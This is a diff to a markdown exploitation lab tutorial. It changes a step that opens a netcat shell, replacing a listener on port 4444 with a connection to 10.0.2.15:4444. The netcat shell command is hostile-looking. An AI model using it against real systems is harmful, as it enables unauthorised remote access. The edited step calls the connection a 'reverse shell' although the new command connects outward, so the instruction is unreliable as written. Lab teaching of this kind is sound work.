@@ -357,7 +357,7 @@ Up until this point in time,  we have been performing [Denial of Service](https:
    3. Observe the program hitting the long jump instruction.
    4. Observe that we are not at the start of the shell code!
 
-4. Now run netcat and use the reverse shell: `nc -lv -p 4444`.
+4. Now run netcat and use the reverse shell: `nc 10.0.2.15 4444`.
 
       <img src="Images/exploit1-exploit.png" width=600>
 
